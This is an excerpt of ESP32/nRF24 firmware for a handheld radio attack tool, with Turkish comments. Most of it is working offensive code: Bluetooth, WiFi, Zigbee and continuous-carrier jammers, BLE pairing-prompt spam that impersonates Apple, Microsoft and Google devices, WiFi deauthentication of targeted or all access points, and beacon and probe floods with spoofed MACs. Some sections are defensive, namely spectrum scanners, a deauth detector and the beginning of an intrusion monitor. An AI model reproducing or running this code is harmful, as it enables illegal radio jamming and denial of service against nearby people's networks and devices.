    radio2.setChannel(ch2);
    delayMicroseconds(60);
    radio2.writeFast(jamBuf, 32);
  }
  ch = (ch + 1) % 126;
  static int flush = 0;
  if ((++flush & 0x0F) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// WiFi Jam — 1/6/11 çift radyo ile paralel
void wifiJam() {
  static int idx = 0;
  const int wifiNrf[] = {12, 37, 62}; // WiFi 1/6/11
  if (radio1Active) {
    radio1.setChannel(wifiNrf[idx]);
    delayMicroseconds(60);
    radio1.writeFast(jamBuf, 32);
  }
  if (radio2Active) {
    radio2.setChannel(wifiNrf[(idx + 1) % 3]);
    delayMicroseconds(60);
    radio2.writeFast(jamBuf, 32);
  }
  idx = (idx + 1) % 3;
  static int flush = 0;
  if ((++flush & 0x0F) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// Multi Jam — BT (2402-2426) + WiFi (2412-2472) aynı anda
void multiJam() {
  static int ch = 0;
  if (radio1Active) {
    radio1.setChannel(2 + (ch % 25));     // BT band
    delayMicroseconds(50);
    radio1.writeFast(jamBuf, 32);
  }
  if (radio2Active) {
    radio2.setChannel(12 + (ch % 60));    // WiFi band
    delayMicroseconds(50);
    radio2.writeFast(jamBuf, 32);
  }
  ch = (ch + 1) % 60;
  static int flush = 0;
  if ((++flush & 0x0F) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// Sweep Jam — çift radyo 180° out of phase, tüm bant
void sweepJam() {
  static int ch1 = 0, ch2 = 63;
  if (radio1Active) {
    radio1.setChannel(ch1);
    delayMicroseconds(50);
    radio1.writeFast(jamBuf, 32);
    ch1 = (ch1 + 1) % 126;
  }
  if (radio2Active) {
    radio2.setChannel(ch2);
    delayMicroseconds(50);
    radio2.writeFast(jamBuf, 32);
    ch2 = (ch2 + 1) % 126;
  }
  static int flush = 0;
  if ((++flush & 0x0F) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// Channel Range Jam — kullanıcı tanımlı band, çift radyo 50% split
void channelRangeJam(int lo, int hi) {
  static int ch = -1;
  int span = hi - lo + 1;
  if (span <= 0) span = 1;
  if (ch < lo || ch > hi) ch = lo;
  int mid = lo + span / 2;
  if (radio1Active) {
    radio1.setChannel(ch);
    delayMicroseconds(60);
    radio1.writeFast(jamBuf, 32);
  }
  if (radio2Active) {
    int ch2 = mid + ((ch - lo) % max(1, span / 2));
    if (ch2 > hi) ch2 = lo + (ch2 - hi);
    radio2.setChannel(ch2);
    delayMicroseconds(60);
    radio2.writeFast(jamBuf, 32);
  }
  ch++;
  if (ch > hi) ch = lo;
}

// CW Jammer — kesintisiz taşıyıcı (en güçlü tek kanal saldırısı)
void cwJammer(int ch) {
  if (radio1Active) {
    radio1.stopConstCarrier();
    radio1.setChannel(ch);
    delayMicroseconds(200);
    radio1.startConstCarrier(RF24_PA_MAX, ch);
  }
  if (radio2Active) {
    radio2.stopConstCarrier();
    int ch2 = min(125, ch + 2);
    radio2.setChannel(ch2);
    delayMicroseconds(200);
    radio2.startConstCarrier(RF24_PA_MAX, ch2);
  }
}

// Zigbee Jam — IEEE 802.15.4 ch11-26 (2405-2480 MHz)
// Eşleme: zbCh 11 → nRF 5, zbCh 26 → nRF 80
void zigbeeJam() {
  static int zbCh = 11;
  int nrf = 5 + (zbCh - 11) * 5;
  if (radio1Active) {
    radio1.setChannel(nrf);
    delayMicroseconds(60);
    radio1.writeFast(jamBuf, 32);
  }
  if (radio2Active) {
    radio2.setChannel(min(125, nrf + 5));
    delayMicroseconds(60);
    radio2.writeFast(jamBuf, 32);
  }
  zbCh++;
  if (zbCh > 26) zbCh = 11;
  static int flush = 0;
  if ((++flush & 0x0F) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// Noise Generator — her paket öncekiyle farklı, rastgele kanal spam
void noiseGen() {
  static int burst = 0;
  for (int k = 0; k < 4; k++) {
    if (radio1Active) {
      radio1.setChannel(random(0, 84));
      radio1.writeFast(jamBuf, 32);
    }
    if (radio2Active) {
      radio2.setChannel(random(42, 126));
      radio2.writeFast(jamBuf, 32);
    }
  }
  if ((++burst & 0x07) == 0) {
    if (radio1Active) radio1.txStandBy(0, true);
    if (radio2Active) radio2.txStandBy(0, true);
  }
}

// ============================================================
// WATERFALL
// ============================================================
void shiftWaterfall(uint8_t *wf, int w, int h) {
  for (int y = 0; y < h - 1; y++)
    for (int x = 0; x < w; x++) {
      bool bit = (wf[(y + 1) * 16 + x / 8] >> (x % 8)) & 1;
      if (bit) wf[y * 16 + x / 8] |= (1 << (x % 8));
      else     wf[y * 16 + x / 8] &= ~(1 << (x % 8));
    }
  for (int x = 0; x < w; x++) wf[(h - 1) * 16 + x / 8] &= ~(1 << (x % 8));
}

void drawWaterfall(uint8_t *wf, int w, int h, const char *ll, const char *rl) {
  display.clearDisplay();
  display.drawBitmap(0, 0, wf, w, h, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, h + 2); display.print(ll);
  display.setCursor(90, h + 2); display.print(rl);
  display.display();
}

// ============================================================
// SPECTRUM ANALYZERS (ADVANCED RF & 2.4 GHz PRO SUITE)
// ============================================================

void runWiFiSpectrum() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setChannel(2);
    radio2.startListening();
  } else if (radio1Active) {
    radio.setAutoAck(false);
    radio.setChannel(2);
    radio.startListening();
  }

  RF24 &scanRadio = radio2Active ? radio2 : radio;
  const int NUM_CH = 13;
  int nrfCh[NUM_CH];
  for (int i = 0; i < NUM_CH; i++) nrfCh[i] = 12 + i * 5;

  uint8_t levels[NUM_CH] = {0};
  uint8_t peaks[NUM_CH] = {0};
  uint8_t wf[128 * 2] = {0};
  const int wfW = 128, wfH = 16;
  int selectedCh = 0; // 0 = auto peak, 1-13 = focus
  bool viewMode = false; // false = bars + waterfall, true = high-res curve

  displayInfo("WiFi Spectrum", "UP/DN:Ch SEL:Mode", "Hold SEL 5s: Exit");
  safeDelay(1200);

  unsigned long lastPeakDecay = millis();

  while (true) {
    if (checkGameExit()) {
      if (radio2Active) radio2.stopListening();
      if (radio1Active) radio.stopListening();
      initRadios();
      currentState = STATE_MENU;
      return;
    }

    if (upPressed())   selectedCh = (selectedCh == 0) ? NUM_CH : selectedCh - 1;
    if (downPressed()) selectedCh = (selectedCh + 1) % (NUM_CH + 1);
    if (selPressed())  viewMode = !viewMode;

    // Shift waterfall down by 1 row
    for (int y = wfH - 1; y > 0; y--) {
      for (int b = 0; b < 16; b++) wf[y * 16 + b] = wf[(y - 1) * 16 + b];
    }
    for (int b = 0; b < 16; b++) wf[b] = 0;

    int peakCh = 1;
    int maxHit = 0;

    for (int i = 0; i < NUM_CH; i++) {
      scanRadio.setChannel(nrfCh[i]);
      delayMicroseconds(80);
      int hits = 0;
      for (int s = 0; s < 12; s++) {
        if (scanRadio.testRPD()) hits++;
        delayMicroseconds(40);
      }
      levels[i] = hits;
      if (hits > peaks[i]) peaks[i] = hits;
      if (hits > maxHit) { maxHit = hits; peakCh = i + 1; }

      int wx = map(i, 0, NUM_CH - 1, 6, wfW - 8);
      int density = map(hits, 0, 12, 0, 4);
      for (int dx = -1; dx <= 1; dx++) {
        int px = wx + dx;
        if (px >= 0 && px < wfW && density > 0) {
          wf[px / 8] |= (1 << (px % 8));
        }
      }
      yield();
    }

    if (millis() - lastPeakDecay > 180) {
      lastPeakDecay = millis();
      for (int i = 0; i < NUM_CH; i++) if (peaks[i] > 0) peaks[i]--;
    }

    display.clearDisplay();

    if (!viewMode) {
      drawHeader("2.4GHz WiFi Spectrum");
      display.setCursor(0, 10);
      if (selectedCh == 0) {
        display.print("PEAK:CH "); display.print(peakCh);
        display.print(" ("); display.print(2412 + (peakCh - 1) * 5); display.print("M)");
      } else {
        display.print("FOCUS:CH "); display.print(selectedCh);
        display.print(" Lvl:"); display.print(levels[selectedCh - 1]);
      }

      for (int i = 0; i < NUM_CH; i++) {
        int x = map(i, 0, NUM_CH - 1, 6, 120);
        int barH = map(levels[i], 0, 12, 0, 24);
        int peakH = map(peaks[i], 0, 12, 0, 24);

        if (selectedCh == (i + 1)) {
          display.drawRect(x - 2, 44 - 24, 7, 26, SSD1306_WHITE);
        }

        display.fillRect(x - 1, 44 - barH, 5, barH, SSD1306_WHITE);
        display.drawFastHLine(x - 2, 44 - peakH, 7, SSD1306_WHITE);
      }

      display.drawFastHLine(0, 45, 128, SSD1306_WHITE);
      display.setCursor(6, 47); display.print("1");
      display.setCursor(58, 47); display.print("6");
      display.setCursor(112, 47); display.print("11");

      for (int y = 0; y < wfH; y++) {
        for (int x = 0; x < wfW; x++) {
          if ((wf[y * 16 + x / 8] >> (x % 8)) & 1) {
            display.drawPixel(x, 48 + y, SSD1306_WHITE);
          }
        }
      }
    } else {
      drawHeader("Spectrum Curve");
      display.setCursor(0, 10);
      display.print("Max:"); display.print(maxHit);
      display.setCursor(55, 10);
      display.print("Pk:Ch"); display.print(peakCh);

      int prevX = 0, prevY = 60;
      for (int i = 0; i < NUM_CH; i++) {
        int x = map(i, 0, NUM_CH - 1, 4, 124);
        int y = 60 - map(levels[i], 0, 12, 0, 44);
        if (i > 0) display.drawLine(prevX, prevY, x, y, SSD1306_WHITE);
        display.drawCircle(x, y, 2, SSD1306_WHITE);
        prevX = x; prevY = y;
      }
      display.drawFastHLine(0, 61, 128, SSD1306_WHITE);
    }

    drawExitProgress();
    display.display();
    safeDelay(25);
  }
}

void runBLESpectrum() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setChannel(2);
    radio2.startListening();
  } else if (radio1Active) {
    radio.setAutoAck(false);
    radio.setChannel(2);
    radio.startListening();
  }

  RF24 &scanRadio = radio2Active ? radio2 : radio;
  const int advCh[3] = {2, 26, 80};
  const char* advLabels[3] = {"CH 37", "CH 38", "CH 39"};
  const int advFreq[3] = {2402, 2426, 2480};

  uint8_t advHits[3] = {0};
  uint8_t advPeaks[3] = {0};
  uint32_t totalBeacons = 0;

  displayInfo("BLE Radar", "3 Adv Channels", "Hold SEL 5s: Exit");
  safeDelay(1200);

  unsigned long lastPeakTime = millis();

  while (true) {
    if (checkGameExit()) {
      if (radio2Active) radio2.stopListening();
      if (radio1Active) radio.stopListening();
      initRadios();
      currentState = STATE_MENU;
      return;
    }

    for (int i = 0; i < 3; i++) {
      scanRadio.setChannel(advCh[i]);
      delayMicroseconds(100);
      int h = 0;
      for (int s = 0; s < 16; s++) {
        if (scanRadio.testRPD()) { h++; totalBeacons++; }
        delayMicroseconds(50);
      }
      advHits[i] = h;
      if (h > advPeaks[i]) advPeaks[i] = h;
    }

    if (millis() - lastPeakTime > 250) {
      lastPeakTime = millis();
      for (int i = 0; i < 3; i++) if (advPeaks[i] > 0) advPeaks[i]--;
    }

    display.clearDisplay();
    drawHeader("BLE Radar Spect");
    display.setCursor(0, 10); display.print("Adv Pkts: "); display.print(totalBeacons);

    for (int i = 0; i < 3; i++) {
      int x = 14 + i * 42;
      display.setCursor(x - 2, 21); display.print(advLabels[i]);
      display.setCursor(x - 4, 30); display.print(advFreq[i]);

      display.drawRect(x + 4, 40, 10, 22, SSD1306_WHITE);
      int fillH = map(advHits[i], 0, 16, 0, 20);
      int peakH = map(advPeaks[i], 0, 16, 0, 20);
      display.fillRect(x + 5, 61 - fillH, 8, fillH, SSD1306_WHITE);
      display.drawFastHLine(x + 3, 61 - peakH, 12, SSD1306_WHITE);
    }

    drawExitProgress();
    display.display();
    safeDelay(30);
  }
}

void runRFAnalyzer() {
  stopRadios();
  if (radio1Active) { radio.setAutoAck(false); radio.startListening(); }
  if (radio2Active) { radio2.setAutoAck(false); radio2.startListening(); }

  const int NUM_RF = 86;
  uint8_t rfEnergy[NUM_RF] = {0};
  uint8_t rfPeaks[NUM_RF] = {0};
  int cursorCh = 40;

  displayInfo("2.4G RF Scanner", "UP/DN:Marker SEL:Peak", "Hold SEL 5s: Exit");
  safeDelay(1200);

  unsigned long lastPeakDecay = millis();

  while (true) {
    if (checkGameExit()) {
      if (radio1Active) radio.stopListening();
      if (radio2Active) radio2.stopListening();
      initRadios();
      currentState = STATE_MENU;
      return;
    }

    if (upPressed())   cursorCh = max(0, cursorCh - 2);
    if (downPressed()) cursorCh = min(NUM_RF - 1, cursorCh + 2);

    int maxActiveCh = 0;
    int maxEnergy = 0;
    int totalNoise = 0;

    for (int ch = 0; ch < NUM_RF; ch++) {
      int hits = 0;
      if (radio1Active && radio2Active) {
        if (ch % 2 == 0) {
          radio.setChannel(ch); delayMicroseconds(40);
          if (radio.testRPD()) hits++;
        } else {
          radio2.setChannel(ch); delayMicroseconds(40);
          if (radio2.testRPD()) hits++;
        }
      } else if (radio1Active) {
        radio.setChannel(ch); delayMicroseconds(50);
        if (radio.testRPD()) hits++;
      }
      rfEnergy[ch] = hits;
      if (hits > rfPeaks[ch]) rfPeaks[ch] = hits;
      if (hits > maxEnergy) { maxEnergy = hits; maxActiveCh = ch; }
      totalNoise += hits;
    }

    if (selPressed()) cursorCh = maxActiveCh;

    if (millis() - lastPeakDecay > 300) {
      lastPeakDecay = millis();
      for (int ch = 0; ch < NUM_RF; ch++) if (rfPeaks[ch] > 0) rfPeaks[ch]--;
    }

    display.clearDisplay();
    drawHeader("RF Band Scanner");

    int curFreq = 2400 + cursorCh;
    display.setCursor(0, 10);
    display.print("M:"); display.print(curFreq); display.print("MHz");
    display.setCursor(68, 10);
    display.print("Lvl:"); display.print(rfEnergy[cursorCh] ? "BUSY" : "IDLE");

    display.setCursor(0, 20);
    if (totalNoise > 40) display.print("[!] HIGH RF INTERFERENCE");
    else if (totalNoise > 15) display.print("Status: Active Traffic");
    else display.print("Status: Clean Spectrum");

    display.drawFastHLine(20, 61, 88, SSD1306_WHITE);
    int prevX = 20, prevY = 60;
    for (int ch = 0; ch < NUM_RF; ch++) {
      int x = 20 + ch;
      int y = 60 - (rfEnergy[ch] ? 18 : 0);
      display.drawLine(prevX, prevY, x, y, SSD1306_WHITE);
      if (rfPeaks[ch] > 0) display.drawPixel(x, 40, SSD1306_WHITE);
      prevX = x; prevY = y;
    }

    int markX = 20 + cursorCh;
    display.drawFastVLine(markX, 28, 34, SSD1306_WHITE);
    display.fillTriangle(markX - 2, 28, markX + 2, 28, markX, 32, SSD1306_WHITE);

    drawExitProgress();
    display.display();
    safeDelay(20);
  }
}

// ============================================================
// BLE SPAM
// ============================================================
static const uint8_t bleAA[4] = {0xD6, 0xBE, 0x89, 0x8E};
static uint8_t blePkt[40];
static const char* blePre[] = {
  "AirPods","JBL","Sony","Samsung","Xiaomi","Beats","Bose","Anker","Jabra",
  "Sennheiser","Marshall","Apple","Huawei","OnePlus","Nothing","Google","LG",
  "Motorola","Nokia","Realme","Redmi","Oppo","Vivo","Philips","Panasonic",
  "Skullcandy","JVC","Audio-Technica","Shure","Bang & Olufsen"
};
static const char* bleSuf[] = {
  " Pro"," Lite"," Max"," 2"," 3"," Mini",""," Plus"," Ultra",
  " ANC"," TWS"," Sport"," Buds"," Gen2"," Gen3"," LE"," 4"," 5"," X"," Neo"
};

void bleRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] |= 0xC0;
}
void bleRandomName(uint8_t* name, int maxLen) {
  const char* pre = blePre[random(30)];
  const char* suf = bleSuf[random(20)];
  int pl = strlen(pre), sl = strlen(suf);
  int total = pl + sl; if (total > maxLen) total = maxLen;
  memcpy(name, pre, pl); memcpy(name + pl, suf, sl);
  name[total] = 0;
}
uint32_t bleCrc(const uint8_t* data, int len, uint32_t crc) {
  for (int i = 0; i < len; i++) {
    crc ^= data[i];
    for (int j = 0; j < 8; j++) {
      if (crc & 1) crc = (crc >> 1) ^ 0x8C;
      else crc >>= 1;
    }
  }
  return crc;
}
void bleInitRadio() {
  stopRadios();
  if (!radio1Active && !radio.begin(&spiBus)) return;
  radio1Active = true;
  radio.setAutoAck(false); radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(4);
  radio.openWritingPipe(bleAA);
  radio.setChannel(2);
}
void bleSendPacket(int ch, uint8_t* mac, uint8_t* pdu, int len) {
  if (ch == 37) radio.setChannel(2);
  else if (ch == 38) radio.setChannel(26);
  else radio.setChannel(80);
  int pos = 0;
  blePkt[pos++] = 0xAA;
  memcpy(&blePkt[pos], bleAA, 4); pos += 4;
  blePkt[pos++] = (len & 0x3F) | 0x40;
  blePkt[pos++] = len;
  memcpy(&blePkt[pos], mac, 6); pos += 6;
  memcpy(&blePkt[pos], pdu, len); pos += len;
  uint32_t crc = bleCrc(&blePkt[5], pos - 5, 0x555555);
  blePkt[pos++] = crc & 0xFF;
  blePkt[pos++] = (crc >> 8) & 0xFF;
  blePkt[pos++] = (crc >> 16) & 0xFF;
  radio.writeFast(blePkt, pos);
  radio.txStandBy();
}

void runBLESpam() {
  displayInfo("BLE SPAM", "Init...");
  bleInitRadio();
  safeDelay(400);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0, start = millis();
  unsigned long pktCount = 0;
  displayInfo("BLE SPAM", "Spamming...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 60) {
      bleRandomMac(mac);
      int advLen = 0;
      uint8_t name[20];
      bleRandomName(name, 15);
      int nlen = strlen((char*)name);
      adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
      adv[advLen++] = nlen + 1; adv[advLen++] = 0x09;
      memcpy(&adv[advLen], name, nlen); advLen += nlen;
      adv[advLen++] = 5; adv[advLen++] = 0xFF;
      for (int i = 0; i < 4; i++) adv[advLen++] = random(256);
      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
      pktCount++;
      if (millis() - start > 1000) {
        display.clearDisplay();
        drawHeader("BLE SPAM");
        display.setCursor(0, 14); display.print("Pkts/s: "); display.print(pktCount);
        display.setCursor(0, 28); display.print("Total: "); display.print(millis() / 1000); display.print("s");
        display.display();
        pktCount = 0; start = millis();
      }
    }
    yield();
  }
  initRadios();
}

void runAppleJuice() {
  displayInfo("Sour Apple", "Broadcasting...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 0x1E; adv[advLen++] = 0xFF; adv[advLen++] = 0x4C; adv[advLen++] = 0x00;
    adv[advLen++] = 0x07; adv[advLen++] = 0x19; adv[advLen++] = 0x07;
    for (int i = 0; i < 22; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runSwiftPair() {
  displayInfo("Swift Pair", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 7; adv[advLen++] = 0xFF; adv[advLen++] = 0x06; adv[advLen++] = 0x00;
    adv[advLen++] = 0x03; adv[advLen++] = 0x00; adv[advLen++] = 0x80;
    for (int i = 0; i < 4; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runFastPair() {
  displayInfo("Fast Pair", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 14; adv[advLen++] = 0x16; adv[advLen++] = 0xFE; adv[advLen++] = 0x2C;
    adv[advLen++] = 0x00; adv[advLen++] = 0x00;
    for (int i = 0; i < 8; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runRickroll() {
  displayInfo("Rickroll", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  const uint8_t rickData[] = "Never gonna";
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 0x0C; adv[advLen++] = 0x09;
    memcpy(&adv[advLen], rickData, 11); advLen += 11;
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runBLEBadUSB() {
  displayInfo("BLE BadUSB", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 11; adv[advLen++] = 0xFF; adv[advLen++] = 0x4C; adv[advLen++] = 0x00;
    adv[advLen++] = 0x0F; adv[advLen++] = 0x05;
    for (int i = 0; i < 6; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

// ============================================================
// WIFI DEAUTH
// ============================================================
static bool deauthActive = false;
static uint8_t deauthBSSID[6];
static uint16_t deauthChannel = 0;
static bool deauthAll = false;

void deauthTask(void* pv) {
  uint8_t packet[26];
  memset(packet, 0, 26);
  packet[0] = 0xC0; packet[1] = 0x00;
  while (deauthActive) {
    if (deauthAll) {
      for (int ch = 1; ch <= 13 && deauthActive; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t spoofed[6];
        for (int i = 0; i < 6; i++) spoofed[i] = random(256);
        esp_wifi_set_mac(WIFI_IF_AP, spoofed);
        memcpy(packet + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(packet + 10, spoofed, 6);
        memcpy(packet + 16, spoofed, 6);
        for (int i = 0; i < 5; i++) { esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false); delay(4); }
      }
    } else {
      esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_mac(WIFI_IF_AP, deauthBSSID);
      memcpy(packet + 4, deauthBSSID, 6);
      memcpy(packet + 10, deauthBSSID, 6);
      memcpy(packet + 16, deauthBSSID, 6);
      for (int i = 0; i < 10; i++) { esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false); delay(1); }
    }
    yield();
  }
  vTaskDelete(NULL);
}
void startDeauthTask(bool all) {
  deauthActive = true; deauthAll = all;
  xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 1);
}
void stopDeauth() { deauthActive = false; safeDelay(100); }

void runWiFiDeauth() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks", "SEL to return");
    while (!selPressed()) yield();
    recoverFromWiFi(); return;
  }
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("Deauth Target");
    display.setCursor(0, 12); display.print("AP "); display.print(sel + 1); display.print("/"); display.print(n);
    display.setCursor(0, 24); display.println(WiFi.SSID(sel).substring(0, 20));
    display.setCursor(0, 36); display.print("Ch:"); display.print(WiFi.channel(sel));
    display.setCursor(0, 48); display.print("RSSI:"); display.print(WiFi.RSSI(sel));
    display.display();
    if (upPressed()) sel = (sel == 0) ? n - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % n;
    yield();
  }
  memcpy(deauthBSSID, WiFi.BSSID(sel), 6);
  deauthChannel = WiFi.channel(sel);
  displayInfo("Deauthing", WiFi.SSID(sel), "SEL to stop");
  startDeauthTask(false);
  while (!selPressed()) yield();
  stopDeauth();
  WiFi.scanDelete();
  recoverFromWiFi();
}

void runWiFiDeauthAll() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  displayInfo("Deauth ALL", "All channels", "SEL to stop");
  startDeauthTask(true);
  while (!selPressed()) yield();
  stopDeauth();
  recoverFromWiFi();
}

// ============================================================
// BEACON / PROBE FLOOD
// ============================================================
void runWiFiBeaconFlood() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  const char* fakes[] = {
    "FreeWiFi","Starbucks","McDonalds","AirportWiFi","HotelGuest",
    "PublicWiFi","AndroidAP","iPhone","HomeWiFi","OfficeWiFi",
    "Linksys","NETGEAR","TP-Link","Xfinity","Belkin"
  };
  const int num = 15;
  uint8_t pkt[128];
  int chan = 1;
  displayInfo("Beacon Flood", "SEL to stop");
  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;
    for (int i = 0; i < num; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++) spoofed[j] = random(256);
      esp_wifi_set_mac(WIFI_IF_AP, spoofed);
      memset(pkt, 0, 128);
      pkt[0] = 0x80; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, spoofed, 6);
      memcpy(pkt + 16, spoofed, 6);
      pkt[22] = random(256); pkt[23] = random(256);
      int pos = 24;
      memset(pkt + pos, 0, 8); pos += 8;
      pkt[pos++] = 0x64; pkt[pos++] = 0x00;
      pkt[pos++] = 0x21; pkt[pos++] = 0x04;
      pkt[pos++] = 0x00; pkt[pos++] = strlen(fakes[i]);
      memcpy(pkt + pos, fakes[i], strlen(fakes[i])); pos += strlen(fakes[i]);
      pkt[pos++] = 0x01; pkt[pos++] = 0x08;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(1); yield();
    }
  }
  recoverFromWiFi();
}

void runProbeFlood() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  const char* ssids[] = {"Home","Office","Free","Guest","Linksys","Cafe","Hotel","Shop"};
  uint8_t pkt[128];
  int chan = 1;
  displayInfo("Probe Flood", "SEL to stop");
  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;
    for (int i = 0; i < 8; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++) spoofed[j] = random(256);
      spoofed[0] &= 0xFE;
      memset(pkt, 0, 128);
      pkt[0] = 0x40; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, spoofed, 6);
      memcpy(pkt + 16, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      int pos = 24;
      pkt[pos++] = 0x00; pkt[pos++] = strlen(ssids[i]);
      memcpy(pkt + pos, ssids[i], strlen(ssids[i])); pos += strlen(ssids[i]);
      pkt[pos++] = 0x01; pkt[pos++] = 0x04;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(1); yield();
    }
  }
  recoverFromWiFi();
}

// ============================================================
// DEAUTH DETECT
// ============================================================
volatile uint32_t deauthDetectCount = 0;
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->payload[0] == 0xC0) deauthDetectCount++;
}

void runDeauthDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
  deauthDetectCount = 0;
  unsigned long lastCheck = millis();
  displayInfo("Deauth Detect", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck > 1000) {
      display.clearDisplay();
      drawHeader("Deauth Detect");
      display.setCursor(0, 14); display.print("Count: "); display.print(deauthDetectCount);
      display.setCursor(0, 28); display.print("Status: ");
      if (deauthDetectCount > 20) display.print("ATTACK!");
      else if (deauthDetectCount > 0) display.print("Suspicious");
      else display.print("Normal");
      display.display();
      deauthDetectCount = 0;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ============================================================
// WIDS
// ============================================================
#define MAX_APS 30
struct APInfo { uint8_t bssid[6]; String ssid; int rssi; uint32_t lastSeen; };
APInfo knownAPs[MAX_APS];
int knownAPCount = 0;
volatile uint32_t beaconCount = 0;
volatile uint32_t deauthCnt = 0;
volatile bool evilTwinAlert = false;
String evilTwinSSID = "";

